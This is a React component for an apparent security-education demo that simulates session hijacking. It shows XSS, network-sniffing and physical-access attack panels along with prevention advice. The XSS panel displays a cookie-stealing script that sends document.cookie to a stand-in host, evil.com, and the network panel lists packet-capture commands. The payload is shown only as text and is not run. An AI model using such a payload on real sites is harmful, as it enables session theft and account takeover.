import React, { useState, useEffect } from 'react';
import { Terminal, Cookie, User, AlertTriangle, RefreshCw, Clock } from 'lucide-react';

const SessionHijackingDemo: React.FC = () => {
  const [sessionState, setSessionState] = useState<'logged-out' | 'logged-in' | 'hijacked'>('logged-out');
  const [sessionId, setSessionId] = useState('');
  const [userAgent, setUserAgent] = useState('');
  const [attackMethod, setAttackMethod] = useState<'xss' | 'network' | 'physical'>('xss');
  const [timeRemaining, setTimeRemaining] = useState(1800); // 30 minutes

  const attackMethods = [
    { id: 'xss', name: 'XSS Cookie Theft', description: 'Steal session cookies via malicious JavaScript' },
    { id: 'network', name: 'Network Sniffing', description: 'Intercept unencrypted session data' },
    { id: 'physical', name: 'Physical Access', description: 'Access session from unlocked device' }
  ];

  useEffect(() => {
    let interval: NodeJS.Timeout;
    if (sessionState === 'logged-in' && timeRemaining > 0) {
      interval = setInterval(() => {
        setTimeRemaining(prev => prev - 1);
      }, 1000);
    }
    return () => clearInterval(interval);
  }, [sessionState, timeRemaining]);

  const generateSessionId = () => {
    return 'sess_' + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
  };

  const handleLogin = () => {
    const newSessionId = generateSessionId();
    setSessionId(newSessionId);
    setUserAgent(navigator.userAgent);
    setSessionState('logged-in');
    setTimeRemaining(1800);
  };

  const handleHijack = () => {
    setSessionState('hijacked');
  };

  const handleLogout = () => {
    setSessionState('logged-out');
    setSessionId('');
    setTimeRemaining(1800);
  };

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, '0')}`;
  };

  const getSessionColor = () => {
    switch (sessionState) {
      case 'logged-out': return 'text-gray-400';
      case 'logged-in': return 'text-green-400';
      case 'hijacked': return 'text-red-400';
      default: return 'text-gray-400';
    }
  };

  return (
    <div className="space-y-6">
      {/* Session Status */}
      <div className="bg-gray-700 rounded-lg p-4">
        <div className="flex items-center justify-between">
          <h4 className="font-semibold flex items-center">
            <Terminal className="w-4 h-4 text-cyan-400 mr-2" />
            Session Management
          </h4>
          <div className={`px-3 py-1 rounded-full text-xs font-medium border ${
            sessionState === 'logged-out' 
              ? 'bg-gray-500/20 text-gray-400 border-gray-500/30'
              : sessionState === 'logged-in'
              ? 'bg-green-500/20 text-green-400 border-green-500/30'
              : 'bg-red-500/20 text-red-400 border-red-500/30'
          }`}>
            {sessionState.replace('-', ' ').toUpperCase()}
          </div>
        </div>

        {sessionState !== 'logged-out' && (
          <div className="mt-4 grid grid-cols-1 md:grid-cols-2 gap-4">
            <div className="bg-gray-800 p-3 rounded border">
              <div className="text-xs text-gray-400 mb-1">Session ID:</div>
              <div className="font-mono text-xs text-cyan-400 break-all">{sessionId}</div>
            </div>
            <div className="bg-gray-800 p-3 rounded border">
              <div className="text-xs text-gray-400 mb-1">Time Remaining:</div>
              <div className="font-mono text-xs text-yellow-400 flex items-center">
                <Clock className="w-3 h-3 mr-1" />
                {formatTime(timeRemaining)}
              </div>
            </div>
          </div>
        )}

        <div className="mt-4 flex space-x-2">
          {sessionState === 'logged-out' && (
            <button
              onClick={handleLogin}
              className="px-4 py-2 bg-green-600 text-white rounded-md hover:bg-green-700 transition-colors"
            >
              <User className="w-4 h-4 inline mr-2" />
              Login to Demo Site
            </button>
          )}
          {sessionState === 'logged-in' && (
            <>
              <button
                onClick={handleLogout}
                className="px-4 py-2 bg-gray-600 text-white rounded-md hover:bg-gray-500 transition-colors"
              >
                Logout
              </button>
              <button
                onClick={handleHijack}
                className="px-4 py-2 bg-red-600 text-white rounded-md hover:bg-red-700 transition-colors"
              >
                Simulate Hijack
              </button>
            </>
          )}
          {sessionState === 'hijacked' && (
            <button
              onClick={handleLogout}
              className="px-4 py-2 bg-gray-600 text-white rounded-md hover:bg-gray-500 transition-colors"
            >
              <RefreshCw className="w-4 h-4 inline mr-2" />
              Reset Demo
            </button>
          )}
        </div>
      </div>

      {/* Attack Methods */}
      <div className="bg-gray-700 rounded-lg p-4">
        <h4 className="font-semibold mb-3">Attack Methods</h4>
        
        <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
          {attackMethods.map((method) => (
            <button
              key={method.id}
              onClick={() => setAttackMethod(method.id as any)}
              className={`p-3 rounded-lg border text-left transition-all ${
                attackMethod === method.id
                  ? 'bg-red-500/20 border-red-500/50 text-red-400'
                  : 'bg-gray-600 border-gray-500 text-gray-300 hover:bg-gray-500'
              }`}
            >
              <div className="font-medium text-sm">{method.name}</div>
              <div className="text-xs text-gray-400 mt-1">{method.description}</div>
            </button>
          ))}
        </div>

        {/* Attack Details */}
        <div className="mt-4 bg-gray-800 rounded-lg p-4">
          <h5 className="font-medium text-white mb-3">{attackMethods.find(m => m.id === attackMethod)?.name} Details</h5>
          
          {attackMethod === 'xss' && (
            <div className="space-y-3">
              <div className="bg-red-900/30 border border-red-700/50 rounded p-3">
                <div className="text-sm text-red-300 mb-2">Malicious JavaScript Payload:</div>
                <code className="text-xs font-mono text-red-400 block bg-gray-800 p-2 rounded">
                  {`<script>
// Steal session cookie
document.location='http://evil.com/steal.php?cookie='+document.cookie;
</script>`}
                </code>
              </div>
              <div className="text-sm text-gray-300">
                When executed, this script sends the user's session cookie to an attacker-controlled server.
              </div>
            </div>
          )}

          {attackMethod === 'network' && (
            <div className="space-y-3">
              <div className="bg-red-900/30 border border-red-700/50 rounded p-3">
                <div className="text-sm text-red-300 mb-2">Network Sniffing Tools:</div>
                <code className="text-xs font-mono text-red-400 block bg-gray-800 p-2 rounded">
                  {`# Using Wireshark or tcpdump
tcpdump -i wlan0 -s 0 -w capture.pcap
wireshark -i wlan0 -k`}
                </code>
              </div>
              <div className="text-sm text-gray-300">
                On unencrypted networks, session cookies can be captured using network sniffing tools.
              </div>
            </div>
          )}

          {attackMethod === 'physical' && (
            <div className="space-y-3">
              <div className="bg-red-900/30 border border-red-700/50 rounded p-3">
                <div className="text-sm text-red-300 mb-2">Physical Access Scenarios:</div>
                <ul className="text-xs text-red-400 space-y-1">
                  <li>• Unlocked computer/phone</li>
                  <li>• Shared computer with saved sessions</li>
                  <li>• Browser developer tools access</li>
                  <li>• Session storage inspection</li>
                </ul>
              </div>
              <div className="text-sm text-gray-300">
                Physical access to a device with an active session allows immediate account takeover.
              </div>
            </div>
          )}
        </div>
      </div>

      {/* Live Session Data */}
      {sessionState !== 'logged-out' && (
        <div className="bg-gray-700 rounded-lg p-4">
          <h4 className="font-semibold mb-3 flex items-center">
            <Cookie className="w-4 h-4 text-orange-400 mr-2" />
            Current Session Data
          </h4>
          
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div className="bg-gray-800 p-3 rounded border">
              <div className="text-xs text-gray-400 mb-2">Browser Cookies:</div>
              <div className="font-mono text-xs space-y-1">
                <div className={getSessionColor()}>sessionId={sessionId}</div>
                <div className={getSessionColor()}>userId=user_12345</div>
                <div className={getSessionColor()}>role=admin</div>
                <div className={getSessionColor()}>lastActivity={Date.now()}</div>
              </div>
            </div>
            
            <div className="bg-gray-800 p-3 rounded border">
              <div className="text-xs text-gray-400 mb-2">Session Metadata:</div>
              <div className="font-mono text-xs space-y-1">
                <div className={getSessionColor()}>IP: 192.168.1.100</div>
                <div className={getSessionColor()}>Browser: Chrome 120</div>
                <div className={getSessionColor()}>OS: {navigator.platform}</div>
                <div className={getSessionColor()}>Status: {sessionState}</div>
              </div>
            </div>
          </div>

          {sessionState === 'hijacked' && (
            <div className="mt-4 p-4 bg-red-900/30 border border-red-700/50 rounded-lg">
              <div className="flex items-start space-x-3">
                <AlertTriangle className="w-5 h-5 text-red-400 mt-0.5" />
                <div>
                  <div className="text-red-400 font-medium">Session Hijacked!</div>
                  <div className="text-red-300 text-sm mt-1">
                    An attacker now has access to this user session and can perform actions as the logged-in user.
                  </div>
                  <div className="text-red-300 text-xs mt-2">
                    Possible actions: View private data, make transactions, change account settings, access admin panels
                  </div>
                </div>
              </div>
            </div>
          )}
        </div>
      )}

      {/* Prevention Strategies */}
      <div className="bg-blue-900/30 border border-blue-700/50 rounded-lg p-6">
        <h4 className="font-semibold text-blue-400 mb-3">Session Hijacking Prevention</h4>
        <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
          <div>
            <h5 className="font-medium text-blue-300 mb-2">Developer Protections:</h5>
            <ul className="text-blue-200 space-y-1 text-sm">
              <li>• Use HTTPS only</li>
              <li>• Secure cookie flags (HttpOnly, Secure, SameSite)</li>
              <li>• Session token rotation</li>
              <li>• IP address validation</li>
              <li>• Short session timeouts</li>
              <li>• Multi-factor authentication</li>
            </ul>
          </div>
          <div>
            <h5 className="font-medium text-blue-300 mb-2">User Protections:</h5>
            <ul className="text-blue-200 space-y-1 text-sm">
              <li>• Log out from shared computers</li>
              <li>• Use private browsing mode</li>
              <li>• Keep browser updated</li>
              <li>• Avoid public Wi-Fi for sensitive activities</li>
              <li>• Monitor active sessions</li>
              <li>• Use password managers</li>
            </ul>
          </div>
        </div>
      </div>
    </div>
  );
};

export default SessionHijackingDemo;